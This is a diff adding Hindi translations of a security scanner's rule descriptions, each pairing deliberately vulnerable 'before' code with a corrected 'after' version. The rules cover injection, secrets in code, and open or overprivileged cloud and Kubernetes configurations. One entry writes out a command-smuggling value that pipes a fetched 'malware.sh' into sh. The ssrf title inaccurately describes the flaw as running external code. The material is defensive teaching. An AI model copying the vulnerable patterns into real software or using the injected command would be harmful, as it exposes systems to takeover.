@@ -10389,4 +10389,512 @@ router.post("/login", loginLimiter, loginHandler)`,
     },
   }),
 },
+  hi: {
+  "supabase-service-role-in-client": {
+    title: "Supabase की सीक्रेट की ब्राउज़र के लिए बनी फ़ाइल में पहुंच जाती है",
+    description:
+      "पब्लिक प्रीफ़िक्स वाला (जैसे NEXT_PUBLIC_, VITE_) कोई वेरिएबल या क्लाइंट-साइड फ़ाइल Supabase की service role key को रेफ़र करती है। यह key Row Level Security को बायपास कर देती है: अगर यह ब्राउज़र बंडल में पहुंच जाए, तो कोई भी इसे पढ़कर डेटाबेस एडमिनिस्ट्रेटर जैसा व्यवहार कर सकता है।",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (केवल सर्वर)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "कोड में सीधे पासवर्ड या सीक्रेट की लिखी हैं",
+    description:
+      "कोई API की, टोकन या पासवर्ड एनवायरनमेंट वेरिएबल से पढ़ने की बजाय सीधे लिटरल वैल्यू के रूप में लिखा दिखता है। जो कोई भी सोर्स कोड (या रिपॉज़िटरी, अगर पब्लिक है) पढ़ता है, उसे वह सीक्रेट मिल जाता है।",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "प्रोजेक्ट के असली पासवर्ड वाली एक फ़ाइल भी विश्लेषण में शामिल है",
+    description:
+      "असली वैल्यू वाली .env फ़ाइल (न कि .env.example) विश्लेषण में शामिल है। अगर यह फ़ाइल किसी रिपॉज़िटरी या पब्लिक डिप्लॉय में पहुंच जाए, तो इसमें मौजूद हर क्रेडेंशियल उजागर हो जाता है।",
+    fix: {
+      before: `# .env (गलती से कमिट हुई)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (कमिट की गई)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env रिपो से बाहर रहती है (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "कोई भी सभी यूज़र्स का डेटा पढ़ या बदल सकता है",
+    description:
+      "Row Level Security बंद है, या कोई policy यह जांचे बिना कि अनुरोध कौन कर रहा है, सबको एक्सेस देती है (USING (true))। हर ऑथेंटिकेटेड यूज़र — या यहां तक कि एनॉनिमस भी — बाकी सभी का डेटा पढ़ या बदल सकता है।",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "यूज़र द्वारा डाली गई वैल्यू सीधे डेटाबेस क्वेरी में चिपका दी जाती है",
+    description:
+      "एक SQL क्वेरी पैरामीटर इस्तेमाल करने की बजाय सीधे स्ट्रिंग को जोड़कर या इंटरपोलेट करके बनाई जाती है। अगर वह टेक्स्ट (अप्रत्यक्ष रूप से भी) किसी यूज़र से आता है, तो वह खुद क्वेरी को बदल सकता है — SQL injection।",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "पासवर्ड सुरक्षित नहीं लगते",
+    description:
+      "पासवर्ड फ़ील्ड ठीक वैसे ही सेव हो जाता है जैसे वह रिक्वेस्ट में आया था, और फ़ाइल में कोई hashing फ़ंक्शन (bcrypt, argon2, scrypt) नहीं दिखता। अगर डेटाबेस कॉम्प्रोमाइज़ हो जाए, तो सभी पासवर्ड तुरंत इस्तेमाल किए जा सकते हैं।",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "लॉगिन साइन करने के लिए इस्तेमाल होने वाला सीक्रेट कोड में साफ़ लिखा है",
+    description:
+      "jwt.sign / jwt.verify को दिया गया secret (या JWT_SECRET वेरिएबल) एनवायरनमेंट वेरिएबल से आने की बजाय कोड में एक लिटरल वैल्यू है। जो कोई भी इसे पढ़ता है, वह किसी भी यूज़र के लिए मान्य एक्सेस टोकन बना सकता है।",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "सर्वर को बाहरी कमांड चलाने के लिए मजबूर किया जा सकता है",
+    description:
+      "सिस्टम कमांड चलाने वाला फ़ंक्शन (exec, execSync, spawn) इंटरपोलेशन या कॉन्कैटेनेशन से बनी स्ट्रिंग लेता है। अगर उस स्ट्रिंग का कोई हिस्सा यूज़र इनपुट से आता है, तो जो उसे कंट्रोल करता है वह सर्वर पर मनमाने कमांड चला सकता है।",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "बाहर से रास्ता चुनकर सर्वर पर मौजूद किसी फ़ाइल को पढ़ा या लिखा जा सकता है",
+    description:
+      "फ़ाइल पढ़ने, लिखने या भेजने वाला फ़ंक्शन यह जांचे बिना कि वह किसी अनुमति-प्राप्त फ़ोल्डर के अंदर ही रहे, रिक्वेस्ट वैल्यू (query, body, params) से सीधे पाथ लेता है। कोई हमलावर तय फ़ोल्डर से बाहर निकलने और सर्वर पर मौजूद मनमानी फ़ाइलें (जैसे क्रेडेंशियल वाली कॉन्फ़िगरेशन फ़ाइल) पढ़ने या ओवरराइट करने के लिए \"../\" डाल सकता है।",
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("रास्ता मान्य नहीं है")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "यूज़र द्वारा डाली गई वैल्यू MongoDB क्वेरी के अंदर कोड की तरह चलाई जाती है",
+    description:
+      "MongoDB का $where ऑपरेटर हर डॉक्यूमेंट के लिए सर्वर-साइड JavaScript चलाता है — अगर वह स्ट्रिंग यूज़र से आई वैल्यू को जोड़कर बनाई गई है, तो जो इसे कंट्रोल करता है वह डेटाबेस के कॉन्टेक्स्ट में मनमाना कोड चला सकता है, सिर्फ़ सामान्य SQL injection की तरह फ़िल्टर बदलने तक सीमित नहीं।",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "यूज़र द्वारा डाली गई वैल्यू को डेटा नहीं, टेम्पलेट माना जाता है",
+    description:
+      "टेम्पलेट कंपाइल/रन करने वाला फ़ंक्शन एक तय टेम्पलेट इस्तेमाल करके सिर्फ़ डेटा पास करने की बजाय, पूरा टेम्पलेट ही रिक्वेस्ट वैल्यू से लेता है। कोई हमलावर सीधे टेम्पलेट इंजन की सिंटैक्स में लिख सकता है (जैसे Jinja2 के लिए {{7*7}}) और सर्वर पर कोड चला सकता है — Server-Side Template Injection, जो अक्सर सिर्फ़ XSS जैसी डिस्प्ले समस्या तक सीमित न रहकर मनमाने कमांड के एक्ज़ीक्यूशन तक पहुंच जाती है।",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML पार्सर को फ़ाइलें पढ़ने या बाहरी रिक्वेस्ट भेजने के लिए मजबूर किया जा सकता है",
+    description:
+      "XML पार्सर (DocumentBuilderFactory) आसपास की लाइनों में external entities (DOCTYPE) को साफ़ तौर पर बंद किए बिना बनाया जाता है। अगर पार्सर को किसी अविश्वसनीय सोर्स से XML मिलता है, तो हमलावर सर्वर पर मौजूद फ़ाइलें पढ़ने या उसे अपनी पसंद के पते से संपर्क करवाने के लिए एक external entity तय कर सकता है — XML External Entity।",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Dockerfile के किसी ENV या ARG इंस्ट्रक्शन में सीक्रेट सीधे लिखा है",
+    description:
+      "password/secret/token/key जैसे नाम वाले वेरिएबल का ENV या ARG इंस्ट्रक्शन में लिटरल वैल्यू है। .env फ़ाइल (जो आमतौर पर इमेज में नहीं पहुंचती) के उलट, यह वैल्यू खुद Docker इमेज में बेक हो जाती है — जो कोई भी pull कर सकता है या layer history देख सकता है, वह इसे हासिल कर सकता है, भले ही बाद के किसी Dockerfile वर्शन में वह लाइन हटा दी जाए।",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# इसे docker build --build-arg DB_PASSWORD=*** से पास किया जाता है (या, और बेहतर,\n# BuildKit के secret mount से, जो layer history में कभी नहीं पहुंचता)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetes मैनिफ़ेस्ट का कोई कंटेनर privileged मोड में चलता है",
+    description:
+      "किसी कंटेनर के securityContext में \"privileged: true\" कंटेनर और होस्ट के बीच लगभग सारा सामान्य आइसोलेशन बंद कर देता है: कंटेनर होस्ट की डिवाइसेज़ को एक्सेस कर सकता है, उसकी नेटवर्क कॉन्फ़िगरेशन बदल सकता है, और कई मामलों में उस मशीन पर प्रभावी रूप से root एक्सेस हासिल कर सकता है जो उसे चला रही है। सामान्य ऐप के लिए लगभग कभी ज़रूरी नहीं।",
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # सिर्फ़ वही capability जो वाकई ज़रूरी हैं`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Kubernetes मैनिफ़ेस्ट के env वेरिएबल में सीक्रेट साफ़ टेक्स्ट में लिखा है",
+    description:
+      "password/secret/token/key जैसे नाम वाले एनवायरनमेंट वेरिएबल का Secret (\"valueFrom.secretKeyRef\") से पढ़े जाने की बजाय लिटरल वैल्यू (\"value:\") है। खुद मैनिफ़ेस्ट — जो अक्सर किसी रिपॉज़िटरी में कमिट होता है — इसलिए सीक्रेट को साफ़ टेक्स्ट में रखता है, जो उसे भी दिख जाता है जो सिर्फ़ कॉन्फ़िगरेशन पढ़ सकता है, क्लस्टर में कमांड चलाने की ज़रूरत नहीं।",
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Terraform का एक security group पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
+    description:
+      "\"cidr_blocks\" में 0.0.0.0/0 (कोई भी IP एड्रेस) शामिल करने वाला कोई नियम किसी संवेदनशील पोर्ट के पास है — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट (MySQL, Postgres, MongoDB, Redis, SQL Server)। इंटरनेट पर कोई भी उस सर्विस से कनेक्ट करने की कोशिश कर सकता है, न कि सिर्फ़ वे जिन्हें करनी चाहिए।",
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # सिर्फ़ आपका प्राइवेट नेटवर्क, या एक bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Google Cloud का एक firewall नियम पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
+    description:
+      "\"source_ranges\" में 0.0.0.0/0 (कोई भी IP एड्रेस) शामिल करने वाला \"google_compute_firewall\" रिसोर्स किसी संवेदनशील पोर्ट की ओर ट्रैफ़िक की अनुमति देता है — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट (MySQL, Postgres, MongoDB, Redis, SQL Server)। इंटरनेट पर कोई भी उस सर्विस से कनेक्ट करने की कोशिश कर सकता है, न कि सिर्फ़ वे जिन्हें करनी चाहिए।",
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # सिर्फ़ आपका प्राइवेट नेटवर्क, या एक bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Azure का एक नेटवर्क नियम पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
+    description:
+      "किसी नेटवर्क सिक्योरिटी नियम (\"azurerm_network_security_rule\", या \"azurerm_network_security_group\" के अंदर \"security_rule\" ब्लॉक) का \"source_address_prefix\" \"*\" या \"0.0.0.0/0\" पर, दिशा \"Inbound\" और एक्सेस \"Allow\" पर सेट है, और यह किसी संवेदनशील पोर्ट के पास है — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट। इंटरनेट पर कोई भी उस सर्विस से कनेक्ट करने की कोशिश कर सकता है, न कि सिर्फ़ वे जिन्हें करनी चाहिए।",
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # सिर्फ़ आपका प्राइवेट नेटवर्क, या एक bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "किसी Terraform वेरिएबल के default वैल्यू के रूप में एक सीक्रेट लिखा है",
+    description:
+      "password/secret/token/key जैसे नाम वाले वेरिएबल का उसके \"default\" में लिटरल वैल्यू है। रनटाइम पर पास की गई वैल्यू (tfvars, TF_VAR_* एनवायरनमेंट वेरिएबल) के उलट, एक default सोर्स कोड में ही पहुंच जाता है — और अगर रिपॉज़िटरी शेयर्ड या पब्लिक है, तो Terraform state का एक्सेस न होने पर भी कोई भी इसे देख सकता है।",
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # कोई default नहीं: इसे .tfvars फ़ाइल (git से बाहर) या TF_VAR_db_password एनवायरनमेंट वेरिएबल से पास करें\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "किसी बाहरी यूज़र द्वारा कंट्रोल की गई वैल्यू सीधे CI के shell कमांड में पहुंच जाती है",
+    description:
+      'GitHub Actions वर्कफ़्लो का कोई "run:" कमांड pull request का title, branch का नाम या किसी कमेंट के टेक्स्ट जैसी वैल्यू को सीधे इंटरपोलेट करता है — ये सभी किसी बाहरी fork से भी pull request या कमेंट खोलने वाले किसी भी व्यक्ति द्वारा लिखे जा सकते हैं। `"; curl malware.sh | sh #` जैसी वैल्यू CI में मनमाने कमांड चला देगी, उस वर्कफ़्लो में उपलब्ध हर सीक्रेट के एक्सेस के साथ।',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # एनवायरनमेंट वेरिएबल के रूप में पास किया गया, कमांड में कभी सीधे इंटरपोलेट नहीं किया गया`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "वर्कफ़्लो किसी बाहरी pull request का कोड रिपॉज़िटरी के सीक्रेट्स के एक्सेस के साथ चलाता है",
+    description:
+      'वर्कफ़्लो "pull_request_target" इस्तेमाल करता है — जो किसी असंबंधित fork से खोली गई pull request के लिए भी बेस रिपॉज़िटरी की परमिशन और सीक्रेट्स के साथ चलता है — और बेस ब्रांच की बजाय खुद pull request का कोड ("github.event.pull_request.head") चेकआउट करता है। जो pull request खोलता है, उसे असल में उन सीक्रेट्स के एक्सेस के साथ अपना ही कोड चलाने को मिल जाता है।',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # बेस ब्रांच को चेकआउट करता है, PR के कोड को नहीं — या फिर अगर व्यापक\n      # परमिशन/सीक्रेट्स की ज़रूरत न हो तो "pull_request_target" की बजाय\n      # "pull_request" इस्तेमाल करें।\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "रिक्वेस्ट का डेटा ऐसे फ़ॉर्मेट में deserialize किया जाता है जो कोड चला सकता है",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) या node-serialize लाइब्रेरी (Node) सीधे रिक्वेस्ट से ली गई वैल्यू को deserialize कर रहे हैं। JSON के उलट, ये फ़ॉर्मेट deserialization के दौरान ही कोड को रिप्रेज़ेंट और एक्ज़ीक्यूट कर सकते हैं — जो भेजी गई वैल्यू को कंट्रोल करता है वह सर्वर पर मनमाना कोड एक्ज़ीक्यूशन हासिल कर सकता है।",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON पार्सिंग के दौरान कभी कोड एक्ज़ीक्यूट नहीं करता, pickle के उलट`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'कोड साफ़ तौर पर बिना साइन किए JWT टोकन स्वीकार करता है ("none" एल्गोरिद्म)',
+    description:
+      'JWT टोकन वेरीफ़ाई करने के लिए स्वीकृत एल्गोरिद्म में "none" भी शामिल है। "none" एल्गोरिद्म वाले टोकन की कोई साइनेचर वेरीफ़ाई करने की ज़रूरत नहीं होती: कोई भी किसी भी कंटेंट (जैसे एडमिन रोल) के साथ एक बना सकता है और कोड इसे मान्य मान लेगा।',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // स्वीकृत एल्गोरिद्म में "none" कभी शामिल न करें`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "कोई नई टेबल बिना सुरक्षा के बनाई गई लगती है",
+    description:
+      "कोई SQL माइग्रेशन एक टेबल बनाता है लेकिन उसी फ़ाइल में उसी टेबल के लिए Row Level Security चालू नहीं करता। जब तक यह ऐसा ही रहता है, टेबल बिना किसी पाबंदी के बनती है कि कौन इसे पढ़ या लिख सकता है।",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "साइट किसी भी दूसरी वेबसाइट से अनुरोध स्वीकार करती है",
+    description:
+      "CORS हेडर किसी भी origin (*) से अनुरोध स्वीकार करने के लिए सेट है, या cors() मिडलवेयर बिना किसी पाबंदी के इस्तेमाल हो रहा है। कोई भी थर्ड-पार्टी वेबसाइट पहले से ऑथेंटिकेटेड यूज़र के ब्राउज़र से आपकी API कॉल कर सकती है।",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "एडमिन परमिशन वाला कोई फ़ंक्शन यह नहीं जांचता कि उसे कौन इस्तेमाल कर रहा है",
+    description:
+      "किसी route या फ़ंक्शन का नाम एडमिन ऑपरेशन का संकेत देता है, लेकिन आसपास की लाइनों में कोई ऑथेंटिकेशन या रोल चेक नहीं है। जो कोई भी URL जानता हो, वह इसे चला सकता है।",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "साइट को बाहरी कोड चलाने के लिए मजबूर किया जा सकता है",
+    description:
+      "कोई आउटगोइंग HTTP रिक्वेस्ट (fetch, axios) डेस्टिनेशन URL के रूप में सीधे यूज़र की रिक्वेस्ट से आई वैल्यू इस्तेमाल करती है। कोई दुर्भावनापूर्ण यूज़र आपके सर्वर से इंटरनल या मनमाने पतों को कॉल करवा सकता है — Server-Side Request Forgery।",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL मान्य नहीं है")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "पासवर्ड अब आसानी से तोड़े जा सकने वाले तरीके से सुरक्षित हैं",
+    description:
+      "उसी लाइन में, md5() या sha1() किसी पासवर्ड से जुड़ी वैल्यू पर लगाए जाते हैं। ये एल्गोरिद्म कैलकुलेट करने में बहुत तेज़ हैं: डेटाबेस रखने वाला कोई हमलावर हर सेकंड अरबों पासवर्ड आज़मा सकता है।",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kubernetes मैनिफ़ेस्ट का कोई कंटेनर root की तरह चलने के लिए सेट है",
+    description:
+      'securityContext में "runAsUser: 0" या "runAsNonRoot: false" कंटेनर के अंदर साफ़ तौर पर root के रूप में एक्ज़ीक्यूशन को लागू करता है। अगर कोई हमलावर कंटेनर के अंदर कोड चलाने में कामयाब हो जाए (जैसे किसी वल्नरेबल लाइब्रेरी का फ़ायदा उठाकर), तो कंटेनर के अंदर root होना होस्ट तक पहुंचना या व्यापक असर डालना आसान बना देता है।',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetes मैनिफ़ेस्ट का कोई कंटेनर शुरुआत से ज़्यादा प्रिविलेज हासिल कर सकता है",
+    description:
+      'securityContext में "allowPrivilegeEscalation: true" कंटेनर के अंदर किसी प्रोसेस को उसे शुरू करने वाले प्रोसेस से ज़्यादा प्रिविलेज हासिल करने देता है (जैसे setuid बिट वाले किसी बाइनरी के ज़रिए)। एप्लिकेशन की किसी वल्नरेबिलिटी के साथ मिलकर, यह तय से ज़्यादा प्रिविलेज वाले कोड के एक्ज़ीक्यूशन की ओर एक और कदम है।',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetes मैनिफ़ेस्ट का कोई pod होस्ट का नेटवर्क, प्रोसेस या शेयर्ड मेमोरी शेयर करता है",
+    description:
+      'true पर सेट "hostNetwork", "hostPID" या "hostIPC" pod को उसके सामान्य आइसोलेशन से बाहर निकाल देते हैं: hostNetwork pod को होस्ट के नेटवर्क पर उजागर करता है (क्लस्टर की नेटवर्क पॉलिसी को बायपास करते हुए), hostPID उसे होस्ट मशीन के हर प्रोसेस की विज़िबिलिटी देता है, hostIPC उसे होस्ट की शेयर्ड मेमोरी का एक्सेस देता है। सामान्य ऐप के लिए लगभग कभी ज़रूरी नहीं — आमतौर पर सिर्फ़ लो-लेवल सिस्टम/मॉनिटरिंग टूल्स के लिए।',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Terraform में डिफ़ाइन किए गए S3 bucket पर Block Public Access बंद है",
+    description:
+      '"aws_s3_bucket_public_access_block" की चार सुरक्षाओं (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) में से एक या ज़्यादा false पर सेट हैं। इसका मतलब यह नहीं कि bucket पहले से ही पब्लिक है, लेकिन यह वह सेफ्टी नेट हटा देता है जो इसे भविष्य में गलती से पब्लिक बनने से रोकता।',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraform में डिफ़ाइन की गई कोई IAM policy पूरा एक्सेस दे देती है",
+    description:
+      'action "*" और resource "*" वाला कोई statement हर AWS सर्विस और रिसोर्स का पूरा एक्सेस दे देता है — वही चेक जो पहले से ही live IAM state पर किया जाता है, यहां लागू होने से पहले ही सीधे कोड से पढ़ा गया। यह किसी इमरजेंसी रोल के लिए मतलब हो सकता है, लेकिन इसे कन्फ़र्म करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वही परमिशन दें जो वाकई ज़रूरी हैं।',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "कोई Google Cloud Storage bucket किसी के भी लिए पढ़ने लायक बना दिया गया है",
+    description:
+      '"google_storage_bucket_iam_member" या "google_storage_bucket_iam_binding" रिसोर्स "allUsers" या "allAuthenticatedUsers" को कोई रोल दे देता है — पहला bucket को बिना Google अकाउंट के भी इंटरनेट पर किसी के भी लिए पढ़ने लायक बना देता है; दूसरा किसी भी Google अकाउंट वाले के लिए, न कि सिर्फ़ उनके लिए जिनके पास एक्सेस होना चाहिए।',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # सिर्फ़ वे जिन्हें वाकई एक्सेस होना चाहिए, allUsers/allAuthenticatedUsers नहीं\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Azure स्टोरेज अकाउंट पर पब्लिक blob एक्सेस चालू है",
+    description:
+      '"azurerm_storage_account" पर "allow_blob_public_access" true पर सेट है: पब्लिक बनाए गए blob/container का URL जानने वाला कोई भी, बिना किसी ऑथेंटिकेशन के, उसे पढ़ सकता है।',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "कोई Google Cloud IAM रोल पूरा एक्सेस (Owner/Editor) दे देता है",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member" (या organization/folder स्तर का बराबर) प्राइमिटिव रोल "roles/owner" या "roles/editor" असाइन करता है — प्रोजेक्ट की लगभग हर सर्विस का पूरा एक्सेस। यह किसी इमरजेंसी अकाउंट के लिए मतलब हो सकता है, लेकिन इसे कन्फ़र्म करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वही ज़्यादा स्पेसिफ़िक predefined रोल दें जो वाकई ज़रूरी हों।',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # सिर्फ़ वह predefined रोल जो वाकई ज़रूरी है, roles/owner नहीं\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "कोई Azure role assignment पूरा एक्सेस (Owner) दे देता है",
+    description:
+      '"azurerm_role_assignment" "Owner" रोल असाइन करता है — पूरे असाइन किए गए scope (subscription, resource group...) पर पूरा एक्सेस, जिसमें दूसरे यूज़र्स की परमिशन पर कंट्रोल भी शामिल है। यह किसी इमरजेंसी अकाउंट के लिए मतलब हो सकता है, लेकिन इसे कन्फ़र्म करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वह ज़्यादा स्पेसिफ़िक रोल दें जो वाकई ज़रूरी है (जैसे किसी एक resource group पर "Contributor")।',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
